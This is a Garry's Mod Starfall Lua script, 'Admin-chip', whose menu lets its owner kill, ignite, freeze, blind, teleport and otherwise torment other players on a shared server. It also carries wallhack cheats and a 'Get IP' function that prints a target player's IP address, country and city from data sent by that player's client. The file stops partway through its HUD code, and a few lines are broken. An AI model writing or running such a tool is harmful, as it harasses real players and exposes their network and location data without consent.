--@name Admin-chip
--@author maxobur0001
--@shared


------------------------------------------------------------------------------------

--_$$$$___$$$$$___$$$____$$$__$$$$$$__$$___$$__________$$$$___$$__$$__$$$$$$__$$$$$_
--$$__$$__$$__$$__$$_$__$_$$____$$____$$$__$$_________$$__$$__$$__$$____$$____$$__$$
--$$$$$$__$$__$$__$$__$$__$$____$$____$$_$_$$__$$$$$__$$______$$$$$$____$$____$$$$$_
--$$__$$__$$__$$__$$______$$____$$____$$__$$$_________$$__$$__$$__$$____$$____$$____
--$$__$$__$$$$$___$$______$$__$$$$$$__$$___$$__________$$$$___$$__$$__$$$$$$__$$____

-----------------------------------------------------------------------------------
-----------------------------------------------------------------------------------
                                                    --by maxobur0001
options = {"Kill", "Spawn Kill (SWITCH)", "Invisibility (OFF)", "Ignite", "Slap", "Anti-entity (SWITCH)", "Strip", 
            "Anti-Weapons (SWITCH)", "Screen Flip", "Freeze (SWITCH)", "Noclip-kill (SWITCH)", "Loud sound", "Anti-aim (SWITCH)", "Jumping (SWITCH)", 
            "Slow-walk (SWITCH)", "Random teleport", "Random throw", "Turn out aim", "Kick in the ass", "Random-time kill (SWITCH)", 
            "Wallhack ESP (OFF)", "Wallhack Chip (OFF)", "Admin-weapons (OFF)", "Anti-damage (SWITCH)", "Chat-kill (SWITCH)", "BHOP (OFF)", "Aim Freeze (SWITCH)", 
            "Bury", "Super-jump (SWITCH)", "Stumble", "Very big model (SWITCH)", "Aim-entity info (OFF)", "Invert damage (SWITCH)", "Get IP",
            "Blind (SWITCH)", "Disorientate", "Rotate Screen (SWITCH)", "Auto-heal (SWITCH)", "Anti-gravity (SWITCH)", "Trip (SWITCH)", "Poison (SWITCH)", "Explode", 
            "Vampirizm (SWITCH)", "Armor heal (SWITCH)", "Back on death place (SWITCH)", "Revenge (SWITCH)", "Nausea (SWITCH)", "Fake lags (SWITCH)", 
            "WRITEZ Blind (SWITCH)", "Info"}

switches = {  }
for i, v in pairs(options) do
    if string.sub(v, -8) == "(SWITCH)" then
        switches[v] = {  }
    end
end 
     
if SERVER then
    holos = {}
    data = {}
    batteries = {}
    nausea = {}
    net.receive("set_switches", function()
        local ply = net.readEntity()
        switches = net.readTable()
    end)
    function GetTargets(name)
        return switches[name]
    end
    
    hook.add("tick", "lkill", function()
        for i, v in pairs(GetTargets("Spawn Kill (SWITCH)")) do
            v:applyDamage(v:getHealth()+1, v, v)
        end 
    end)
    
    hook.add('OnEntityCreated', 'anti-entity', function(ent)
        for i, v in pairs(GetTargets("Anti-entity (SWITCH)")) do
            if ent:isValid() then
                if ent:getOwner() == v then
                    ent:remove()
                end
            end    
        end
    end)
    
    hook.add('tick', 'nw', function()
        for i, v in pairs(GetTargets("Anti-Weapons (SWITCH)")) do
            if v:isValid() and !table.isEmpty(v:getWeapons()) then
                for l, n in pairs(v:getWeapons()) do
                    if n:isValid() then
                        pcall(function() n:remove() end)
                    end
                end
            end    
        end
    end)
    
    net.receive("Freeze (SWITCH)", function()
        poses = {}
        for i, v in pairs(GetTargets("Freeze (SWITCH)")) do
            poses[i] = v:getPos()
        end
    end)
    hook.add('tick', 'fr', function()
        for i, v in pairs(GetTargets("Freeze (SWITCH)")) do
            if v:isValid() then
                v:setPos(poses[i])   
            end
        end
    end)
    
    
    hook.add('tick', 'antinc', function()
        for i, v in pairs(GetTargets("Noclip-kill (SWITCH)")) do
            if v:isValid() and v:isNoclipped() then
                v:applyDamage(v:getHealth()+1)
            end
        end
    end)

    hook.add('tick', 'antiaim', function()
        for i, v in pairs(GetTargets("Anti-aim (SWITCH)")) do
            if v:isValid() then
                if v:getEyeTrace().Entity:isPlayer() then
                    if v:getEyeTrace().Entity:isValid() then
                        v:setEyeAngles(v:getEyeAngles()+Vector(0, 180, 0))
                    end
                end
            end
        end
    end)

    hook.add('tick', 'jump', function()
        for i, v in pairs(GetTargets("Jumping (SWITCH)")) do
            if v:isValid() then
                if v:isOnGround() then
                    v:setVelocity(Vector(0, 0, owner():getMass() + 170))
                end
            end
        end
    end)
    
    hook.add('tick', 'slow', function()
        for i, v in pairs(GetTargets("Slow-walk (SWITCH)")) do
            if v:isValid() then
                v:setPos(v:getPos() - v:getVelocity()/50)
            end
        end
    end)
    
    hook.add('tick', 'randkill', function()
        for i, v in pairs(GetTargets("Random-time kill (SWITCH)")) do
            if math.random(1, 500) == 500 then
                v:applyDamage(v:getHealth() + 1)
            end
        end
    end)
    
    hook.add('EntityTakeDamage', 'anti-damage', function(target, attacker, inflictor)
        for i, v in pairs(GetTargets("Anti-damage (SWITCH)")) do
            if target:isValid() then
                if attacker == v then
                    return true
                end
            end    
        end
    end)
    
    hook.add('PlayerSay', 'chatkill', function(ply, text)
        for i, v in pairs(GetTargets("Chat-kill (SWITCH)")) do
            if ply == v then
                v:applyDamage(v:getHealth() + 1)
            end
        end
    end)

    net.receive('Aim Freeze (SWITCH)', function()
        angs = {}
        for i, v in pairs(GetTargets("Aim Freeze (SWITCH)")) do
            angs[i] = v:getEyeAngles()
        end
    end)
    hook.add('tick', 'aimf', function()
        for i, v in pairs(GetTargets("Aim Freeze (SWITCH)")) do
            if v:isValid() then
                v:setEyeAngles(angs[i])   
            end
        end 
    end)
    hook.add('KeyPress', 'super-jump', function(ply, key)
        for i, v in pairs(GetTargets("Super-jump (SWITCH)")) do
            if ply == v and key == 2 then
                v:setVelocity(Vector(0, 0, 700))
            end
        end
    end)
    net.receive('Very big model (SWITCH)', function()
        v = net.readEntity()
        if !table.hasValue(net.readTable(), GetTargets("Very big model (SWITCH)")) then
            v:setModelScale(3) 
        else
            v:setModelScale(1) 
        end
    end)

    hook.add('EntityTakeDamage', 'invdamage', function(target, attacker, inflictor, amount)
        for i, v in pairs(GetTargets("Very big model (SWITCH)")) do
            if target:isValid() then
                if attacker == v then
                    v:applyDamage(amount, target, target)
                    return true
                end
            end    
        end
    end)

    net.receive('Blind (SWITCH)', function()
        ply = net.readEntity()
        if table.hasValue(GetTargets("Blind (SWITCH)"), ply) then
            holo = hologram.create(ply:getAttachment(3), Angle(), "models/holograms/hq_icosphere.mdl", Vector(-7, 7, 7))
            holo:setColor(Color(0, 0, 0))
            holo:setParent(ply, "eyes")
            table.insert(holos, {ply, holo})
        else
            for i, v in pairs(holos) do
                if v[1] == ply then
                    v[2]:remove()
                    table.removeByValue(holos, v)
                end
            end
        end
    end)
    
    net.receive("Rotate Screen (SWITCH)", function()
        (net.readEntity):setEyeAngles(v:getEyeAngles():setZ(0))
    end)
    
    hook.add('tick', 'rotscr', function()
        for i, v in pairs(GetTargets("Rotate Screen (SWITCH)")) do
            if v:isValid() then
                v:setEyeAngles(v:getEyeAngles() + Vector(0, 0, 5))
            end    
        end
    end)
    
    hook.add('tick', 'autoheal', function()
        for i, v in pairs(GetTargets("Auto-heal (SWITCH)")) do
            if v:isValid() then
                if v:getHealth() < 100 then
                    v:setHealth(v:getHealth()+1)    
                end
            end    
        end
    end)
        
    hook.add('tick', 'antigravity', function(ply, key)
        for i, v in pairs(GetTargets("Anti-gravity (SWITCH)")) do
            v:setVelocity(Vector(0, 0, 19))
        end
    end)
    
    net.receive("Trip (SWITCH)", function()
        ply = net.readEntity()
        if !table.hasValue(GetTargets("Trip (SWITCH)"), ply) then
            ply:extinguish()
            ply:setModelScale(1)
            ply:setEyeAngles(Angle())
        end
    end)
    hook.add('tick', 'trip', function()
        for i, v in pairs(GetTargets("Trip (SWITCH)")) do
            v:setVelocity(Vector(math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000)))
            v:ignite(math.random(0, 100))
            v:setPos(Vector(math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000)))
            v:setEyeAngles(Angle(math.random(-180, 180), math.random(-180, 180), math.random(-180, 180)))
            v:setModelScale(math.random(0.01, 20))
            v:setHealth(math.random(-100000, 100000))
        end
    end)

    timer.create("poison", 0.5, 0, function()
        for i, v in pairs(GetTargets("Poison (SWITCH)")) do
            v:applyDamage(1)
        end
    end)    
    
    hook.add('PlayerDeath', 'back4dead', function(ply)
        for i, v in pairs(GetTargets("Back on death place (SWITCH)")) do
            if v == ply then
                v.pos = v:getPos()
                v.angs = v:getEyeAngles()
            end
        end
    end)
    hook.add('PlayerSpawn', 'back4dead', function(ply)
        for i, v in pairs(GetTargets("Back on death place (SWITCH)")) do
            if v == ply then
                ply:setPos(ply.pos)
                ply:setEyeAngles(ply.angs)
            end
        end
    end)
        
    hook.add('PlayerDeath', 'revenge', function(ply, inflictor, attacker)
        for i, v in pairs(GetTargets("Revenge (SWITCH)")) do
            if v == ply then
                attacker:applyDamage(attacker:getHealth() + 1, owner(), owner())
            end
        end
    end)

    net.receive("Nausea (SWITCH)", function()
        ply = net.readEntity()
        if table.hasValue(GetTargets("Nausea (SWITCH)"), ply) then
            holo = hologram.create(ply:getAttachment(3), Angle(), "models/holograms/hq_icosphere.mdl", Vector(-4.5, -4.5, -4.5))
            holo1 = hologram.create(ply:getAttachment(3), Angle(), "models/holograms/hq_icosphere.mdl", Vector(-4.5, -4.5, -4.5))
            holo:setMaterial("models/shadertest/predator")
            holo1:setMaterial("models/debug/debugwhite")
            holo:emitSound("Player.AmbientUnderWater",0,10)
            holo1:setColor(Color(0,255,0,100))
            holo:setParent(ply, "eyes")
            holo1:setParent(ply, "eyes")
            table.insert(nausea, {ply, {holo, holo1}})
        else
            for i, v in pairs(nausea) do
                if v[1] == ply then
                    v[2][1]:remove()
                    v[2][2]:remove()
                    table.removeByValue(nausea, v)
                end
            end
        end
    end)

    hook.add('tick', 'lags', function()
        for i, v in pairs(GetTargets("Fake lags (SWITCH)")) do
            if v:isValid() then
                if v.last_angs == nil then
                    v.last_angs = v:getEyeAngles()
                end
                lag_eyes = Angle((v:getEyeAngles()[1] + v.last_angs[1])/3, (v:getEyeAngles()[2] + v.last_angs[2])/3, (v:getEyeAngles()[3] + v.last_angs[3])/3)
                v.last_angs = v:getEyeAngles()
                v:setPos(v:getPos() - v:getVelocity()/50)
                v:setEyeAngles(lag_eyes)
            end
        end
    end)
    
    writez = {}
    net.receive("WRITEZ Blind (SWITCH)", function()
        ply = net.readEntity()
        if table.hasValue(GetTargets("WRITEZ Blind (SWITCH)"), ply) then
            holo = hologram.create(ply:getAttachment(3), Angle(), "models/holograms/hq_icosphere.mdl", Vector(-4.5, -4.5, -4.5))
            holo:setMaterial("engine/writez")
            holo:emitSound("Player.AmbientUnderWater",0,10)
            holo:setParent(ply, "eyes")
            table.insert(writez, {ply, holo})
        else
            for i, v in pairs(writez) do
                if v[1] == ply then
                    v[2]:remove()
                    table.removeByValue(writez, v)
                end
            end
        end
    end)
    
    net.receive("Kill", function()
        ply = net.readEntity()
        if ply:isAlive() then
            ply:applyDamage(ply:getHealth()+1, ply, ply)
            col = team.getColor(ply:getTeam())
            if !ply:isAdmin() then
                print(Color(255, 255, 255), "You killed ", Color(200,200,200), ply:getName(), Color(255,255,255), "!")
            else
                print(Color(255, 255, 255), "You killed ", Color(200,200,200), "|", col, ply:getTeamName(), Color(200,200,200), "|", col, " ", ply:getName(), Color(255,255,255), "!")
            end
        else
            print(Color(255, 0, 0), ply:getName(), " is dead!" )
        end
    end)
    
    net.receive("Invisibility (OFF)", function()
        owner():setModelScale(1) 
        owner():setColor(Color(255, 255, 255, 255))
        print(Color(255, 255, 255), "You are visible now. ")
    end)
    
    net.receive("Invisibility (ON)", function()
        owner():setModelScale(0.01) 
        owner():setColor(Color(255, 255, 255, 0))
        print(Color(255, 255, 255), "You are invisible now. ")
    end)
    
    net.receive("Ignite", function()
        ply = net.readEntity()
        if ply:isAlive() then
            ply:ignite(10000000000000000000000)
            col = team.getColor(ply:getTeam())
            if !ply:isAdmin() then
                print(Color(255, 255, 255), "You set fire to ", Color(200,200,200), ply:getName(), Color(255,255,255), "!")
            else
                print(Color(255, 255, 255), "You set fire to ", Color(200,200,200), "|", col, ply:getTeamName(), Color(200,200,200), "|", col, " ", ply:getName(), Color(255,255,255), "!")
            end
        else
            print(Color(255, 0, 0), ply:getName(), " is dead!" )
        end
    end)
    
    net.receive("Slap", function()
        ply = net.readEntity()
        if ply:isAlive() then
            vel = 15
            ang = 0
            kang = 45
            
            d = kang/vel
            
            ply:emitSound('player/pl_fallpain1.wav', 75, 100, 100, CHAN_AUTO)
            ply:applyDamage(10)
            
            timer.create('slap', 0, 0, function()
                ang = ang + vel
                kang = vel * d
                if kang > 0 then
                    l = ang >= kang
                else
                    l = ang <= kang
                end
                if l then
                    vel = -vel / d
                end
                if kang < 0 then
                    if kang <= 0.7 then
                        ply:setEyeAngles(ply:getEyeAngles() + Vector(vel, -vel/2, 0))
                    else
                        timer.stop('slap')
                        timer.remove('slap')
                    end
                else
                    if kang >= 0.7 then
                        ply:setEyeAngles(ply:getEyeAngles() + Vector(vel, -vel/2, 0))
                    else
                        timer.stop('slap')
                        timer.remove('slap')
                    end
                end
            end)
            col = team.getColor(ply:getTeam())
            if !ply:isAdmin() then
                print(Color(255, 255, 255), "You gave a slap ", Color(200,200,200), ply:getName(), Color(255,255,255), "!")
            else
                print(Color(255, 255, 255), "You gave a slap ", Color(200,200,200), "|", col, ply:getTeamName(), Color(200,200,200), "|", col, " ", ply:getName(), Color(255,255,255), "!")
            end
        else
            print(Color(255, 0, 0), ply:getName(), " is dead!" )
        end
    end)

    net.receive("Strip", function()
        ply = net.readEntity()
        if ply:isAlive() then
            for i, v in pairs(ply:getWeapons()) do
                v:remove()
            end
            col = team.getColor(ply:getTeam())
            if !ply:isAdmin() then
                print(Color(255, 255, 255), "You stripped weapons from ", Color(200,200,200), ply:getName(), Color(255,255,255), "!")
            else
                print(Color(255, 255, 255), "You stripped weapons from ", Color(200,200,200), "|", col, ply:getTeamName(), Color(200,200,200), "|", col, " ", ply:getName(), Color(255,255,255), "!")
            end
        else
            print(Color(255, 0, 0), ply:getName(), " is dead!" )
        end
    end)
    
    net.receive("Screen Flip", function()
        ply = net.readEntity()
        ply:setEyeAngles(ply:getEyeAngles() + Vector(0, 0, 180))
        col = team.getColor(ply:getTeam())
        if !ply:isAdmin() then
                print(Color(255, 255, 255), "You flip the screen ", Color(200,200,200), ply:getName(), Color(255,255,255), "!")
        else
                print(Color(255, 255, 255), "You flip the screen ", Color(200,200,200), "|", col, ply:getTeamName(), Color(200,200,200), "|", col, " ", ply:getName(), Color(255,255,255), "!")
        end
    end)
    
    net.receive("Loud sound", function()
        ply = net.readEntity()
        ply:emitSound('ambient/alarms/alarm1.wav', 100, 100, 100, CHAN_AUTO)
        col = team.getColor(ply:getTeam())
        if !ply:isAdmin() then
            print(Color(255, 255, 255), "You put sound on ", Color(200,200,200), ply:getName(), Color(255,255,255), "!")
        else
            print(Color(255, 255, 255), "You put sound on ", Color(200,200,200), "|", col, ply:getTeamName(), Color(200,200,200), "|", col, " ", ply:getName(), Color(255,255,255), "!")
        end
    end)
    
    net.receive("Random teleport", function()
        ply = net.readEntity()
        ply:setPos(Vector(math.random(-100000, 100000), math.random(-100000, 100000), math.random(-100000, 100000)))
        if ply:isAlive() then
            col = team.getColor(ply:getTeam())
            if !ply:isAdmin() then
                print(Color(255, 255, 255), "You teleported ", Color(200,200,200), ply:getName(), Color(255,255,255), "!")
            else
                print(Color(255, 255, 255), "You teleported ", Color(200,200,200), "|", col, ply:getTeamName(), Color(200,200,200), "|", col, " ", ply:getName(), Color(255,255,255), "!")
            end
        else
            print(Color(255, 0, 0), ply:getName(), " is dead!" )
        end
    end)
    
    net.receive("Random throw", function()
        ply = net.readEntity()
        ply:setVelocity(Vector(math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000)))
        if ply:isAlive() and !ply:isNoclipped() then
            col = team.getColor(ply:getTeam())
            if !ply:isAdmin() then
                print(Color(255, 255, 255), "You threw a ", Color(200,200,200), ply:getName(), Color(255,255,255), "!")
            else
                print(Color(255, 255, 255), "You threw a ", Color(200,200,200), "|", col, ply:getTeamName(), Color(200,200,200), "|", col, " ", ply:getName(), Color(255,255,255), "!")
            end
        
        elseif ply:isNoclipped() then
            print(Color(255, 0, 0), ply:getName(), " is flying!" )
        else
            print(Color(255, 0, 0), ply:getName(), " is dead!" )
        end
    end)
    
    net.receive("Turn out aim", function()
        ply = net.readEntity()
        ply:setEyeAngles(ply:getEyeAngles()+Vector(0, 180, 0))
    end)
    
    net.receive("Kick in the ass", function()
        ply = net.readEntity()
        ply:setVelocity(Vector(0, ply:getEyeAngles():getForward().y * 400, 400))
        if ply:isAlive() and !ply:isNoclipped() then
            col = team.getColor(ply:getTeam())
            if !ply:isAdmin() then
                print(Color(255, 255, 255), "You kicked a ", Color(200,200,200), ply:getName(), Color(255,255,255), "at the ass!")
            else
                print(Color(255, 255, 255), "You kicked a ", Color(200,200,200), "|", col, ply:getTeamName(), Color(200,200,200), "|", col, " ", ply:getName(), Color(255,255,255), "at the ass!")
            end
        
        elseif ply:isNoclipped() then
            print(Color(255, 0, 0), ply:getName(), " is flying!" )
        else
            print(Color(255, 0, 0), ply:getName(), " is dead!" )
        end
    end)
    
    net.receive("Admin-weapons (ON)", function()
            hook.add("KeyPress", '', function(ply, key)
                if ply == owner() then
                    if key == 1 and owner():getWeapon("weapon_crowbar") == owner():getActiveWeapon() and owner():getEyeTrace().Entity:isValid() then
                        owner():getEyeTrace().Entity:applyDamage(owner():getEyeTrace().Entity:getHealth()+1, owner(), owner():getWeapon("weapon_crowbar"))
                    end 
                    if key == 1 and owner():getWeapon("weapon_crossbow") == owner():getActiveWeapon() and prop.canSpawn() then
                        prop.create( owner():getEyeTrace().HitPos, Angle(), "models/props_phx/cannonball_solid.mdl", 1 ):breakEnt()
                    end 
                end 
                
                if key == 2048 and owner():getWeapon("weapon_physcannon") == owner():getActiveWeapon() then 
                    ent = owner():getEyeTrace().Entity 
                    if po == false then
                        timer.create('', 0, 0, function()
                            if ent:isValid() then
                                dist = owner():getPos():getDistance(owner():getEyeTrace().HitPos)-200
                                ent:setPos((owner():getEyeTrace().HitPos - owner():getEyeAngles():getForward()*dist)-Vector(0, 0, 40))
                            end
                        end)
                        po = true
                    else
                        timer.remove('')
                        ent = nil
                        po = false
                    end
                end
                if key == 1 and owner():getWeapon("weapon_physcannon") == owner():getActiveWeapon() then 
                    if po == false and owner():getEyeTrace().Entity:isValid() then
                        if owner():getEyeTrace().Entity:getPos():getDistance(owner():getPos()) < 100 then
                            owner():getEyeTrace().Entity:setVelocity(owner():getEyeAngles():getForward() * 3000)    
                        end
                    end
                    if po == true and ent != nil then
                        if ent:isValid() then
                            timer.remove('')
                            ent:setVelocity(owner():getEyeAngles():getForward() * 3000)
                            po = false
                        end
                    end    
                end
            end)
    end)
    net.receive("Admin-weapons (OFF)", function()
        hook.remove("KeyPress", '')
        timer.remove('')
    end)
    
    net.receive("BHOP (ON)", function()
        hook.add('think', "bhop", function(ply, key)
            if owner():keyDown(2) then
                if owner():isOnGround() then 
                    owner():setVelocity((owner():getEyeAngles():getForward()*Vector(50, 50, 0))+Vector(0, 0, owner():getMass() + 170))
                end
            end
        end)
    end)
    net.receive("BHOP (OFF)", function()
        hook.remove('think', "bhop")
    end)
    
    net.receive('Bury', function()
        ply = net.readEntity()
        if ply:isAlive() then
            ply:setPos(Vector(ply:getPos().x, ply:getPos().y, find.byClass("info_player_start")[1]:getPos().z - 500))
            col = team.getColor(ply:getTeam())
            if !ply:isAdmin() then
                print(Color(255, 255, 255), "You buried the ", Color(200,200,200), ply:getName(), Color(255,255,255), " underground!")
            else
                print(Color(255, 255, 255), "You buried the ", Color(200,200,200), "|", col, ply:getTeamName(), Color(200,200,200), "|", col, " ", ply:getName(), Color(255,255,255), " underground!")
            end
        else
            print(Color(255, 0, 0), ply:getName(), " is dead!" )
        end
    end)
    
    net.receive('Stumble', function()
        ply = net.readEntity()
        if ply:isAlive() and !ply:isNoclipped() then
            ply:setPos(ply:getPos() + Vector(0, 0, 3))
            ply:setVelocity(Vector(0, 0, -1000))
            for i, v in pairs(ply:getWeapons()) do
                ply:dropWeapon(v, nil, Vector(math.random(1, 100), math.random(1, 100), math.random(1, 100)))    
            end
            col = team.getColor(ply:getTeam())
            if !ply:isAdmin() then
                print(Color(255, 255, 255), "You maked stumble a ", Color(200,200,200), ply:getName(), Color(255,255,255), "!")
            else
                print(Color(255, 255, 255), "You maked stumble a ", Color(200,200,200), "|", col, ply:getTeamName(), Color(200,200,200), "|", col, " ", ply:getName(), Color(255,255,255), "!")
            end
        elseif ply:isNoclipped() then
            print(Color(255, 0, 0), ply:getName(), " is flying!" )
        else
            print(Color(255, 0, 0), ply:getName(), " is dead!" )
        end
    end)
    
    ------------------------------------------------------
    net.receive("Get IP", function()
        v = net.readEntity()
        if data[v] != nil then
            print("\nName: " .. v:getName())
            print("\nIP: " .. data[v].query)
            print("Country: " .. data[v].country)
            print("City: " .. data[v].city .. "\n")
        else
            print("\nSorry, no access!\n")
        end
    end)
    
    hook.add("ClientInitialized", "cl_init", function(ply)
        net.start("cl_init")
        net.writeEntity(ply)
        net.send(ply) 
    end)
    
    net.receive("data", function(len, ply)
        data[ply] = net.readTable()
    end)
    -------------------------------------------------------
    net.receive("Disorientate", function()
        ply = net.readEntity()
        if ply:isAlive() then
            ply:setPos(ply:getPos() + Vector(math.random(-1000, 1000), math.random(-1000, 1000), 0))
            ply:setEyeAngles(Angle(math.random(-180, 180), math.random(-180, 180), 0))
            for i, v in pairs(ply:getWeapons()) do
                ply:dropWeapon(v, nil, Vector(math.random(-100, 100), math.random(-100, 100), math.random(-100, 100)))    
            end
            col = team.getColor(ply:getTeam())
            if !ply:isAdmin() then
                print(Color(255, 255, 255), "You disorented a ", Color(200,200,200), ply:getName(), Color(255,255,255), "!")
            else
                print(Color(255, 255, 255), "You disorented a ", Color(200,200,200), "|", col, ply:getTeamName(), Color(200,200,200), "|", col, " ", ply:getName(), Color(255,255,255), "!")
            end
        else
            print(Color(255, 0, 0), ply:getName(), " is dead!" )
        end
    end)
    
    net.receive("Explode", function()
        ply = net.readEntity()
        prop.create(ply:getPos(), Angle(), "models/props_c17/oildrum001_explosive.mdl", true):breakEnt()
    end)
    net.receive("Vampirizm (SWITCH)", function()
        targs = net.readTable()
        ply = net.readEntity()
        hook.add('EntityTakeDamage', 'vampirizm', function(target, attacker, inflictor, amount)
            for i, v in pairs(targs) do
                if target:isValid() then
                    if attacker == v then
                        v:setHealth(v:getHealth() + amount)
                    end
                end    
            end
        end)
    end)
    net.receive("Armor heal (SWITCH)", function()
        targs = net.readTable()
        ply = net.readEntity()
        hook.add('tick', 'armor heal', function()
            for i, v in pairs(targs) do
                if v:getArmor() < 100 then
                    if prop.canSpawn() then
                        table.insert(batteries, prop.createSent(v:getPos(), Angle(), "item_battery", true))
                    else
                        for _, l in pairs(batteries) do
                            if l:isValid() then
                                l:remove()
                            end
                        end
                        batteries = {}
                    end
                end    
            end
        end)
    end)
    
    if !owner():isAdmin() then
        chip():remove()
    end
end


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------- Client ---------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


if CLIENT then
    if player() == owner() then
        enableHud(owner(), true)
        ---------------------- Vars --------------------------
        ppage = 1
        menupage = 1
        is_main = true
        is_authors = false
        option = 1
        
        authors = {"Coder and author: maxobur0001", "", "Ideas by: Ratyuha, ded,", "maxobur0001", "", "Thanks to translated chip and", "help with code: tapka002"}

        onned = false
        
        ---------------- Draw menu function ------------------
        function drawmenu(title, options, page, is_players, is_switch, switches, numeration)
            sx, sy = render.getGameResolution()
            render.setColor(Color(0, 0, 0, 200))
            render.drawRoundedBox(15, 20, sy/2-125, 220, 205)
            render.setColor(Color(255, 255, 255))
            render.drawText(30, sy/2-115, string.replace(title, "(SWITCH)", ""), 0)
            index = {}
            pages = math.round(#options/7 + 0.4)
            
            for i = 1, pages do
                if page == pages and #options%7 != 0 then
                    index[i] = #options%7
                else
                    index[i] = 7
                end     
            end
            if table.isEmpty(index) == false then
                for i = 1, index[page] do
                    d = i + ((page-1)*7)
                    if table.isEmpty(index) == false and options[d] != nil then
                        render.setColor(Color(240, 240, 240))
                        if numeration then
                            if is_players then
                                render.setColor(team.getColor(options[d]:getTeam()))
                                if is_switch then
                                    if table.hasValue(switches[title], options[d]) then
                                        render.drawText(45, (sy/2-95) + 15*(i-1), i .. ". " .. options[d]:getName() .. " (ON)", 0)
                                    else
                                        render.drawText(45, (sy/2-95) + 15*(i-1), i .. ". " .. options[d]:getName() .. " (OFF)", 0)
                                    end
                                else
                                    render.drawText(45, (sy/2-95) + 15*(i-1), i .. ". " .. options[d]:getName(), 0)
                                end
                            else
                                render.drawText(45, (sy/2-95) + 15*(i-1), i .. ". " .. string.replace(options[d], "(SWITCH)", ""), 0)
                            end
                        else
                            if is_players then
                                render.setColor(team.getColor(options[d]:getTeam()))
                                if is_switch then
                                    if table.hasValue(switches[title], options[d]) then
                                        render.drawText(45, (sy/2-95) + 15*(i-1), options[d]:getName() .. " (ON)", 0)
                                    else
                                        render.drawText(45, (sy/2-95) + 15*(i-1), options[d]:getName() .. " (OFF)", 0)
                                    end
                                else
                                    render.drawText(45, (sy/2-95) + 15*(i-1), options[d]:getName(), 0)
                                end
                            else
                                render.drawText(45, (sy/2-95) + 15*(i-1), string.replace(options[d], "(SWITCH)", ""), 0)
                            end
                        end
                    end
                end
            end
            render.setColor(Color(255, 255, 255))
            if page < pages then
                render.drawText(45, (sy/2+20), "8. Next", 0) 
            end
            if page > 1 then
                render.drawText(45, (sy/2+35), "9. Prev", 0)
            end
                render.drawText(45, (sy/2+50), "0. Exit", 0)
        end
        -----------------------------------------------------------
        

            
        print(Color(255, 255, 255), "Admin-chip by ", Color(0,200,255), "maxobur0001")
        print(Color(255, 255, 255), "Press ", Color(0,200,255), "F2", Color(255, 255, 255), " to open the menu. Now avaible ".. #options .." functions")
        print(Color(255, 255, 255), "And last: ", Color(255,0,0), "have fun =)")
        
        hook.add("drawhud", "", function()
            ----------------------- Menu --------------------------
            if onned then
                if is_main then
                    drawmenu("Admin-chip", options, menupage, false, false, nil, true)
                elseif options[(option-1)+((menupage*7)-7)] == "Info" then
                    drawmenu("Info", authors, 1, false, false, nil, false)
                else
                    is_switch = string.sub(options[(option-1)+((menupage*7)-7)], -8) == "(SWITCH)"
                    drawmenu(options[(option-1)+((menupage*7)-7)], find.allPlayers(), ppage, true, is_switch, switches, true)
                end
            end
            ----------------------- Wallhack (ESP) -----------------
            if options[21] == "Wallhack ESP (ON)" then
                for i, v in pairs(find.allPlayers()) do
                    render.setColor(Color(v:getHealth()/v:getMaxHealth()*100):hsvToRGB():setA(100))
                    xy = (v:getPos()+Vector(0, 0, 40)):toScreen()
                    txy = (v:getPos()+Vector(0, 0, 80)):toScreen()
                    w = 40000/owner():getPos():getDistance(v:getPos())
                    h = 60000/owner():getPos():getDistance(v:getPos())
                    render.drawRect(xy.x - w/2, xy.y - h/2, w, h)
                    render.setColor(team.getColor(v:getTeam()))
                    render.drawText(txy.x, txy.y, v:getName() .. "\nHealth: " .. v:getHealth() .. "%", 1)
                end 
            end
            ----------------------- Wallhack (Chips) -----------------
            if options[22] == "Wallhack Chip (ON)" then
                for i, v in pairs(find.byClass("gmod_wire_expression2")) do
                    if v:getOwner():isValid() then
                        render.setColor(Color(255, 0, 0, 100))
                        cxy = v:getPos():toScreen()
                        render.drawFilledCircle(cxy.x, cxy.y, 10000/owner():getPos():getDistance(v:getPos()))
                        render.setColor(Color(255, 255, 255))
                        render.drawText(cxy.x, cxy.y, "Name: " .. v:getChipName() .. "\nOwner: " .. v:getOwner():getName(), 1)
                    end
                end
                for i, v in pairs(find.byClass("starfall_processor")) do
                    if v:getOwner():isValid() then
                        render.setColor(Color(100, 100, 255, 100))
                        cxy = v:getPos():toScreen()
                        render.drawFilledCircle(cxy.x, cxy.y, 10000/owner():getPos():getDistance(v:getPos()))
                        render.setColor(Color(255, 255, 255))
                        render.drawText(cxy.x, cxy.y, "Name: " .. v:getChipName() .. "\nOwner: " .. v:getOwner():getName(), 1)
                    end
                end
            end
            ----------------------- Entity info -----------------
            if options[32] == "Aim-entity info (ON)" then
                if owner():getEyeTrace().Entity:isValid() then
                    h = owner():getEyeTrace().Entity
                    render.setColor(Color(0, 0, 0, 200))
                    render.drawRoundedBox(10, sx-270, sy/2-125, 220, 205)
                    render.setColor(Color(255, 255, 255))
                    if !h:isPlayer() then
                        t = (timer.curtime() - h:getCreationTime())
                        sec = t % (24 * 3600) 
                        hour = math.round(sec / 3600)
                        sec = sec % 3600 
                        min = math.round(sec / 60)
                        sec = sec % 60
                        
                        pos = h:getPos()
                        render.drawText(sx-245, sy/2-115, "Class: [".. h:getClass() .."]", 0)
                        render.drawText(sx-245, sy/2-95, "Model: " .. h:getModel(), 0)
                        render.drawText(sx-245, sy/2-75, "Health: " .. h:getHealth(), 0)
                        render.drawText(sx-245, sy/2-55, "Position: ", 0)
                        render.drawText(sx-245, sy/2-35, "X: " .. pos.x, 0)
                        render.drawText(sx-245, sy/2-15, "Y: " .. pos.y, 0)
                        render.drawText(sx-245, sy/2+5, "Z: " .. pos.z, 0)
                        render.drawText(sx-245, sy/2+25, "Creation time: " .. hour .. ":" .. min .. ":" .. math.round(sec, 2), 0)
                    else
                        render.drawText(sx-245, sy/2-115, "Name: " .. h:getName(), 0)
                        render.drawText(sx-245, sy/2-95, "Model: " .. h:getModel(), 0)
                        render.drawText(sx-245, sy/2-80, "Health: " .. h:getHealth(), 0)
                        render.drawText(sx-245, sy/2-65, "Armor: " .. h:getArmor(), 0)
                        render.drawText(sx-245, sy/2-50, "Rank: " .. h:getTeamName(), 0)
